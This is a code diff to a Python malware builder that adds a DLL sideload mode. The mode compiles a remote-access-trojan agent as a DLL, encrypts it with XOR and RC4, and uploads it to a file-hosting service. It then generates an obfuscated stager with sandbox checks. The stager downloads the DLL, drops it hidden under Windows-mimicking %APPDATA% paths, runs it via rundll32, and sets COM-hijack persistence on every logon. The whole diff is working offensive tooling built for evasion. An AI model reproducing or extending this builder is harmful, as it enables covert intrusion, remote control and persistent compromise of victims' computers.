@@ -50,6 +50,26 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
 ]
 
+# DLL drop names — blend into Windows system DLL naming conventions
+DLL_DROP_NAMES = [
+    "ShellServiceHost", "DeviceSetupHost", "SettingSyncBridge",
+    "InputService", "CloudExperienceHost", "CapabilityHandler",
+    "ContentDeliveryBroker", "DiagTrackRunner", "AppResolverCache",
+    "TokenBrokerCore", "WinStoreAgent", "SearchProtocolHost",
+]
+
+# DLL drop subdirs — realistic Windows-style paths under %APPDATA%
+DLL_DROP_SUBDIRS = [
+    r"Microsoft\Windows\Shell",
+    r"Microsoft\Windows\CloudStore",
+    r"Microsoft\Windows\SettingSync",
+    r"Microsoft\InputPersonalization",
+    r"Microsoft\Provisioning",
+    r"Microsoft\Windows\Themes\Cache",
+    r"Microsoft\Network\Connections",
+    r"Microsoft\Windows\Templates",
+]
+
 
 # ============================================================
 # CRYPTO HELPERS — pure Python, no external dependencies
@@ -246,6 +266,84 @@ class VMAssembler:
 
         return bytes(self.program)
 
+    def assemble_dll(self, url, xor_key, rc4_key, drop_path, com_clsid, sleep_ms):
+        """Assemble VM bytecode for DLL sideload pipeline.
+
+        Flow: env_check → sleep → download → decrypt → write DLL →
+              hide file → sleep → LOLBAS exec (rundll32 EntryPoint).
+
+        COM hijack registration is handled by the DLL itself (EntryPoint →
+        performSideload), so the stager only needs to drop and execute it.
+        """
+        self.program = bytearray()
+
+        # Random junk prefix
+        for _ in range(random.randint(2, 6)):
+            if random.random() > 0.4:
+                self._emit_junk()
+            else:
+                self._emit(self.OP_NOP)
+
+        # ENVCK — sandbox/debugger check
+        self._emit(self.OP_ENVCK)
+        self._emit_junk()
+
+        # SLEEP — initial delay
+        self._emit_u16(self.OP_SLEEP, sleep_ms)
+        self._emit(self.OP_NOP)
+        self._emit_junk()
+
+        # PUSH URL → DEOBF → FETCH (download encrypted DLL)
+        self._emit_data(self.OP_PUSH, self._obfuscate(url))
+        self._emit(self.OP_DEOBF)
+        self._emit_junk()
+        self._emit(self.OP_FETCH)
+
+        for _ in range(random.randint(1, 3)):
+            self._emit_junk()
+
+        # RC4 decrypt
+        self._emit_data(self.OP_PUSH, self._obfuscate(rc4_key))
+        self._emit(self.OP_DEOBF)
+        self._emit(self.OP_NOP)
+        self._emit(self.OP_RDEC)
+        self._emit_junk()
+
+        # XOR decrypt
+        self._emit_data(self.OP_PUSH, self._obfuscate(xor_key))
+        self._emit(self.OP_DEOBF)
+        self._emit_junk()
+        self._emit(self.OP_XDEC)
+        self._emit(self.OP_NOP)
+
+        # WFILE — write DLL to %APPDATA%\<drop_path>
+        # Stack before WFILE: [..., decrypted_data, relative_path]
+        # Stack after  WFILE: [..., full_abs_path]
+        self._emit_data(self.OP_PUSH, self._obfuscate(drop_path))
+        self._emit(self.OP_DEOBF)
+        self._emit(self.OP_WFILE)
+        self._emit_junk()
+
+        # HIDE — set hidden+system attributes on dropped DLL
+        # stack[sp-1] = full path from WFILE (HIDE is non-consuming)
+        self._emit(self.OP_HIDE)
+        self._emit_junk()
+
+        # Delay before LOLBAS exec — break temporal correlation
+        self._emit_u16(self.OP_SLEEP, random.randint(3000, 8000))
+        self._emit_junk()
+
+        # LEXEC — rundll32.exe <dropped_dll>,EntryPoint
+        # The DLL's EntryPoint() handles COM hijack registration itself
+        self._emit(self.OP_LEXEC)
+
+        # HALT
+        self._emit(self.OP_HALT)
+
+        for _ in range(random.randint(3, 10)):
+            self._emit_junk()
+
+        return bytes(self.program)
 
 
 # ============================================================
@@ -912,6 +1010,11 @@ def stage_compile_payload(raw_payload, xor_key, rc4_key, litterbox):
         with open(src_path, "w", encoding="utf-8") as f:
             f.write(raw_payload)
 
+        # Copy exe_main.go (provides func main for EXE builds; main.go has runAgent())
+        exe_main_src = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exe_main.go")
+        if os.path.exists(exe_main_src):
+            shutil.copy2(exe_main_src, os.path.join(tmpdir, "exe_main.go"))
+
         out_path = os.path.join(tmpdir, "payload.exe")
         env = os.environ.copy()
         env["GOOS"] = "windows"
@@ -1030,6 +1133,148 @@ def stage_compile_stager(stager_dir, output_name):
 
 
 # ============================================================
+# STAGE — Compile DLL payload (c-shared, CGO)
+# ============================================================
+
+def stage_compile_dll(raw_payload, xor_key, rc4_key, litterbox, dll_name=None, dll_subdir=None):
+    """Compile agent as DLL (c-shared, CGO), dual-layer encrypt, upload.
+
+    The DLL contains:
+    - Full RAT agent (runAgent)
+    - COM proxy (DllGetClassObject/DllCanUnloadNow → mmdevapi.dll)
+    - EntryPoint export for rundll32
+    - Self-sideload + COM hijack registration on init
+
+    dll_name/dll_subdir: randomized per build, injected into dll_sideload.go source.
+    """
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+
+    if dll_name is None:
+        dll_name = random.choice(DLL_DROP_NAMES) + ".dll"
+    if dll_subdir is None:
+        dll_subdir = random.choice(DLL_DROP_SUBDIRS)
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        with open(os.path.join(tmpdir, "main.go"), "w", encoding="utf-8") as f:
+            f.write(raw_payload)
+
+        dll_src = os.path.join(base_dir, "dll_sideload.go")
+        if not os.path.exists(dll_src):
+            raise Exception("dll_sideload.go not found — required for DLL build")
+
+        # Inject randomized drop path constants into dll_sideload.go
+        with open(dll_src, "r", encoding="utf-8") as f:
+            dll_go_src = f.read()
+        dll_go_src = dll_go_src.replace(
+            'sideloadSubdir  = `Microsoft\\Windows\\Shell`',
+            f'sideloadSubdir  = `{dll_subdir}`',
+        )
+        dll_go_src = dll_go_src.replace(
+            'sideloadDLLName = "ShellServiceHost.dll"',
+            f'sideloadDLLName = "{dll_name}"',
+        )
+        with open(os.path.join(tmpdir, "dll_sideload.go"), "w", encoding="utf-8") as f:
+            f.write(dll_go_src)
+        log(f"DLL drop path randomized: {dll_subdir}\\{dll_name}", "OK")
+
+        cc = shutil.which("x86_64-w64-mingw32-gcc")
+        if not cc:
+            raise Exception(
+                "x86_64-w64-mingw32-gcc not found.\n"
+                "Install MinGW-w64: apt install gcc-mingw-w64-x86-64"
+            )
+
+        out_path = os.path.join(tmpdir, "payload.dll")
+        env = os.environ.copy()
+        env["GOOS"] = "windows"
+        env["GOARCH"] = "amd64"
+        env["CGO_ENABLED"] = "1"
+        env["CC"] = cc
+        env["GOTOOLCHAIN"] = "local"
+
+        log("Initializing Go module...")
+        subprocess.run(["go", "mod", "init", "payload"], cwd=tmpdir, capture_output=True, env=env)
+        subprocess.run(["go", "get", "golang.org/x/sys@v0.29.0"], cwd=tmpdir, capture_output=True, env=env)
+        subprocess.run(["go", "mod", "tidy"], cwd=tmpdir, capture_output=True, env=env)
+
+        log("Compiling DLL (c-shared, CGO, stripped)...")
+        build = subprocess.run(
+            ["go", "build", "-buildmode=c-shared", "-tags", "dll",
+             "-ldflags", "-s -w", "-o", out_path, "."],
+            cwd=tmpdir, capture_output=True, text=True, env=env,
+        )
+        if build.returncode != 0:
+            raise Exception(f"DLL build failed:\n{build.stderr}")
+
+        with open(out_path, "rb") as f:
+            bin_data = f.read()
+        log(f"Compiled DLL: {len(bin_data):,} bytes", "OK")
+
+        bin_data = xor_bytes(bin_data, xor_key)
+        log("Layer 1: XOR encrypted", "OK")
+
+        bin_data = rc4_crypt(bin_data, rc4_key)
+        log("Layer 2: RC4 encrypted", "OK")
+
+        enc_path = os.path.join(tmpdir, "payload.bin")
+        with open(enc_path, "wb") as f:
+            f.write(bin_data)
+
+        url = litterbox.upload(enc_path)
+        log("DLL payload uploaded to staging", "OK")
+        return url
+
+
+# ============================================================
+# STAGE — Generate DLL-aware stager (drops DLL + rundll32 exec)
+# ============================================================
+
+def stage_generate_dll_stager(payload_url, xor_key, rc4_key, dll_name=None, dll_subdir=None, sandbox=True):
+    """Generate polymorphic stager that drops DLL and executes via rundll32.
+
+    The DLL's EntryPoint() handles COM hijack registration itself, so the
+    stager only needs to: download → decrypt → write DLL → hide → rundll32.
+
+    dll_name/dll_subdir must match what was injected into dll_sideload.go.
+    """
+    sleep_ms = random.randint(2000, 5000)
+
+    if dll_name is None:
+        dll_name = "ShellServiceHost.dll"
+    if dll_subdir is None:
+        dll_subdir = r"Microsoft\Windows\Shell"
+
+    # Build relative drop path for WFILE opcode (uses forward slashes)
+    drop_path = dll_subdir.replace("\\", "/") + "/" + dll_name
+
+    asm = VMAssembler()
+    bytecode = asm.assemble_dll(
+        url=payload_url,
+        xor_key=xor_key,
+        rc4_key=rc4_key,
+        drop_path=drop_path,
+        com_clsid="{BCDE0395-E52F-467C-8E3D-C4579291692E}",
+        sleep_ms=sleep_ms,
+    )
+    log(f"DLL bytecode assembled: {len(bytecode)} bytes, {len(asm.used_opcodes())} opcodes", "OK")
+
+    source = generate_stager_source(asm, bytecode, sandbox=sandbox)
+    log(f"Polymorphic DLL stager generated ({len(source)} chars)", "OK")
+
+    tmpdir = tempfile.mkdtemp()
+    with open(os.path.join(tmpdir, "main.go"), "w", encoding="utf-8") as f:
+        f.write(source)
+
+    subprocess.run(["go", "mod", "init", "stager"], cwd=tmpdir, capture_output=True)
+
+    log(f"Drop target: %APPDATA%\\{dll_subdir}\\{dll_name}", "OK")
+    log("Exec: rundll32.exe <dll>,EntryPoint → COM hijack registered inside DLL", "OK")
+    if sandbox:
+        log("Anti-analysis: CPU check, timing check", "OK")
+    return tmpdir
+
+
+# ============================================================
 # ============================================================
 # MAIN
 # ============================================================
@@ -1043,6 +1288,55 @@ def main():
     with open(go_file, "r", encoding="utf-8") as f:
         raw_payload = f.read()
     log(f"Loaded payload: main.go ({len(raw_payload)} chars)", "OK")
+
+    # --- DLL sideload mode → outputs EXE stager that drops DLL + COM hijack + rundll32 ---
+    if "--dll" in sys.argv:
+        name_prefixes = ["SetupHost", "Installer", "PkgSetup", "RuntimeSetup", "UpdateHelper"]
+        idx = sys.argv.index("--dll")
+        if idx + 1 < len(sys.argv) and not sys.argv[idx + 1].startswith("-"):
+            output_name = sys.argv[idx + 1]
+            if not output_name.endswith(".exe"):
+                output_name += ".exe"
+        else:
+            output_name = f"{random.choice(name_prefixes)}_{random.randint(100, 999)}.exe"
+        xor_key = generate_key(32)
+        rc4_key = generate_key(32)
+        litterbox = LitterboxAPI(retention="24h")
+
+        dll_name = random.choice(DLL_DROP_NAMES) + ".dll"
+        dll_subdir = random.choice(DLL_DROP_SUBDIRS)
+
+        log(f"DLL sideload mode — final output: {output_name} (EXE stager)")
+        log(f"XOR Key: {xor_key}")
+        log(f"RC4 Key: {rc4_key}")
+        log(f"DLL drop: %APPDATA%\\{dll_subdir}\\{dll_name}")
+        print()
+
+        try:
+            log("--- Stage 1: Compile DLL Payload & Encrypt ---")
+            payload_url = stage_compile_dll(raw_payload, xor_key, rc4_key, litterbox,
+                                            dll_name=dll_name, dll_subdir=dll_subdir)
+
+            log("\n--- Stage 2: Shorten Payload URL ---")
+            short_url = URLShortener.shorten(payload_url)
+            log("Shortened URL ready", "OK")
+
+            log("\n--- Stage 3: Generate DLL Sideload Stager ---")
+            stager_dir = stage_generate_dll_stager(payload_url, xor_key, rc4_key,
+                                                    dll_name=dll_name, dll_subdir=dll_subdir)
+
+            log("\n--- Stage 4: Compile Stager → EXE ---")
+            stage_compile_stager(stager_dir, output_name)
+
+            print()
+            log("=== DLL Sideload Pipeline Complete ===", "OK")
+            log(f"Output: {output_name}", "OK")
+            log("Flow: stager EXE → downloads DLL → drops + hides → rundll32 EntryPoint", "OK")
+            log("Persistence: explorer.exe loads DLL via COM hijack on every logon", "OK")
+        except Exception as e:
+            log(f"Stopped: {e}", "ERR")
+            sys.exit(1)
+        return
 
     # --- Standard EXE stager pipeline ---
     name_prefixes = ["SetupHost", "Installer", "PkgSetup", "RuntimeSetup", "UpdateHelper"]
